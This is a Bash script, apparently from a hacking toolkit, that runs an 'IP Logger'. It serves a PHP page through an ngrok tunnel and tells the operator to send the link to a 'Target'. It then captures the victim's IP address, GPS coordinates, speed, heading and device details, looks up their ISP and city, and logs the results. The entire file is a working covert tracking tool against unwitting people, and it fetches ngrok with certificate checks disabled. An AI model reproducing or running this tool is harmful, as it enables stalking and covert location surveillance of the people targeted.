#!/usr/bin/env bash

iplogger() {

    # path= "info"

    clear
    function logger() {
        banner
        echo -e "   IP Logger {Over Internet}"
    }
    logger

    menu() {
        trap 'echo -e "\n";stop;exit 1' 2

        dependencies() {

            command -v php >/dev/null 2>&1 || {
                echo >&2 "I require php but it's not installed. Install it. Aborting."
                exit 1
            }

            command -v curl >/dev/null 2>&1 || {
                echo >&2 "I require curl but it's not installed. Install it. Aborting."
                exit 1
            }

        }

        stop() {

            checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
            checkphp=$(ps aux | grep -o "php" | head -n1)
            checkssh=$(ps aux | grep -o "ssh" | head -n1)
            if [[ $checkngrok == *'ngrok'* ]]; then
                pkill -f -2 ngrok >/dev/null 2>&1
                killall -2 ngrok >/dev/null 2>&1
            fi
            if [[ $checkphp == *'php'* ]]; then
                pkill -f -2 php >/dev/null 2>&1
                killall -2 php >/dev/null 2>&1
            fi
            if [[ $checkssh == *'ssh'* ]]; then
                pkill -f -2 ssh >/dev/null 2>&1
                killall ssh >/dev/null 2>&1
            fi
            if [[ -e sendlink ]]; then
                rm -rf sendlink
            fi

        }

        catch_cred() {

            longitude=$(grep -o 'Longitude:.*' info/geolocate.txt | cut -d " " -f2 | tr -d ' ')
            IFS=$'\n'
            latitude=$(grep -o 'Latitude:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
            altitude=$(grep -o 'Altitude:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
            accuracy=$(grep -o 'Accuracy:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
            hardware=$(grep -o 'Cores:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
            speed=$(grep -o 'Speed:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
            platform=$(grep -o 'Platform:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
            heading=$(grep -o 'Heading:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
            memory=$(grep -o 'Memory:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
            useragent=$(grep -o 'User-Agent:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
            height=$(grep -o 'Screen Height:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
            width=$(grep -o 'Screen Width:.*' info/geolocate.txt | cut -d ":" -f2 | tr -d ' ')
            # echo -e " Geolocation:"
            echo -e " Latitude:" "$latitude"
            echo -e " Longitude:" "$longitude"
            echo -e " Altitude:" "$altitude"
            echo -e " Speed:" "$speed"
            echo -e " Heading:" "$heading"
            echo -e " Accuracy:n" "$accuracy"
            echo -e " Map: https://www.google.com/maps/place/""$latitude""+""$longitude"
            echo -e " Device Info:"
            echo -e " Platform:" "$platform"
            echo -e " Cores:" "$hardware"
            echo -e " User-Agent:" "$useragent"
            echo -e " Memory:" "$memory"
            echo -e " Resolution:" "$height""x""$width"
            cat info/geolocate.txt >>info/saved.geolocate.txt
            echo -e " Saved: info/saved.geolocate.txt"
            killall -2 php >/dev/null 2>&1
            killall -2 ngrok >/dev/null 2>&1
            killall ssh >/dev/null 2>&1
            if [[ -e sendlink ]]; then
                rm -rf sendlink
            fi
            exit 1

        }

        getcredentials() {
            echo -e " Waiting Geolocation ..."
            while [ true ]; do

                if [[ -e "info/geolocate.txt" ]]; then
                    echo -e "[*] Geolocation Found!"
                    catch_cred

                fi
                sleep 0.5
                if [[ -e "info/error.txt" ]]; then
                    echo -e "\n[*] Error on Geolocation!"
                    checkerror=$(grep -o 'Error:.*' info/error.txt | cut -d " " -f2 | tr -d ' ')
                    if [[ $checkerror == 1 ]]; then
                        echo -e " User Denied Geolocation ..."

                        rm -rf info/error.txt
                        getcredentials
                    elif [[ $checkerror == 2 ]]; then
                        echo -e " Geolocation Unavailable ..."

                        rm -rf info/error.txt
                        getcredentials
                    elif [[ $checkerror == 3 ]]; then
                        echo -e " Time Out ..."

                        rm -rf info/error.txt
                        getcredentials
                    elif [[ $checkerror == 4 ]]; then
                        echo -e " Unknow Error ..."

                        rm -rf info/error.txt
                        getcredentials
                    else
                        echo -e " Error reading file error.txt..."
                        exit 1
                    fi
                fi
                sleep 0.5

            done

        }

        catch_ip() {
            touch info/saved.geolocate.txt
            ip=$(grep -a 'IP:' info/ip.txt | cut -d " " -f2 | tr -d '\r')
            IFS=$'\n'
            ua=$(grep 'User-Agent:' info/ip.txt | cut -d '"' -f2)
            echo -e " Target IP:" "$ip"
            echo -e " User-Agent:" "$ua"
            echo -e " Saved:info/saved.ip.txt"
            cat info/ip.txt >>info/saved.ip.txt

            if [[ -e iptracker.log ]]; then
                rm -rf iptracker.log
            fi

            IFS='\n'
            iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" >iptracker.log)
            IFS=$'\n'
            continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
            echo -e "\n"
            hostnameip=$(grep -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
            if [[ $hostnameip != "" ]]; then
                echo -e "[*] Hostname:" "$hostnameip"
            fi

            reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
            if [[ $reverse_dns != "" ]]; then
                echo -e "[*] Reverse DNS:" "$reverse_dns"
            fi

            if [[ $continent != "" ]]; then
                echo -e "[*] IP Continent:" "$continent"
            fi

            country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
            if [[ $country != "" ]]; then
                echo -e "[*] IP Country:" "$country"
            fi

            state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
            if [[ $state != "" ]]; then
                echo -e "[*] State:" "$state"
            fi

            city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

            if [[ $city != "" ]]; then
                echo -e "[*] City Location:" "$city"
            fi

            isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
            if [[ $isp != "" ]]; then
                echo -e "[*] ISP:" "$isp"
            fi

            as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
            if [[ $as_number != "" ]]; then
                echo -e "[*] AS Number:" "$as_number"
            fi

            ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
            if [[ $ip_speed != "" ]]; then
                echo -e "[*] IP Address Speed:" "$ip_speed"
            fi

            ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

            if [[ $ip_currency != "" ]]; then
                echo -e "[*] IP Currency:" "$ip_currency"
            fi

            echo -e "\n"
            rm -rf iptracker.log

            getcredentials
        }

        start() {
            if [[ -e info/ip.txt ]]; then
                rm -rf info/ip.txt

            fi
            if [[ -e info/geolocate.txt ]]; then
                rm -rf info/geolocate.txt

            fi

            if [[ -e info/error.txt ]]; then
                rm -rf info/error.txt

            fi
            if [[ -e ngrok ]]; then
                echo ""
            else

                echo -e "[*] Downloading Ngrok...\n"
                arch=$(uname -a | grep -o 'arm' | head -n1)
                arch2=$(uname -a | grep -o 'Android' | head -n1)
                if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]]; then
                    command -v wget >/dev/null 2>&1 || {
                        echo >&2 "Cilocks require wget but it's not installed. Install it. Aborting."
                        exit 1
                    }
                    wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip >/dev/null 2>&1

                    if [[ -e ngrok-stable-linux-arm.zip ]]; then
                        unzip ngrok-stable-linux-arm.zip >/dev/null 2>&1
                        chmod +x ngrok
                        rm -rf ngrok-stable-linux-arm.zip
                    else
                        echo -e "[!] Download error... Termux?Nethunter?, run: pkg install wget"
                        exit 1
                    fi

                else

                    wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip >/dev/null 2>&1
                    if [[ -e ngrok-stable-linux-386.zip ]]; then
                        command -v unzip >/dev/null 2>&1 || {
                            echo >&2 "Cilocks require unzip but it's not installed. Install it. Aborting."
                            exit 1
                        }
                        unzip ngrok-stable-linux-386.zip >/dev/null 2>&1
                        chmod +x ngrok
                        rm -rf ngrok-stable-linux-386.zip
                    else
                        echo -e "[!] Download error... "
                        exit 1
                    fi
                fi
            fi

            echo -e "[*] Starting php server..."
            php -t "info/" -S 127.0.0.1:3333 >/dev/null 2>&1 &
            sleep 2
            echo -e "[*] Starting ngrok server..."
            ./ngrok http 3333 >/dev/null 2>&1 &
            sleep 10

            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z-]*\.ngrok.io")
            echo -e "[*] Send this link to the Target:" "$link"
            checkfound
        }

        track_ip() {
            start
        }
        checkfound() {

            echo -e "\n"
            echo -e " Waiting target open the link, Press Ctrl + C to exit..."
            while [ true ]; do

                if [[ -e "info/ip.txt" ]]; then
                    echo -e " IP Found!"
                    catch_ip

                fi
                sleep 1
            done

        }

        dependencies
        track_ip
        menu

    }
    menu
}
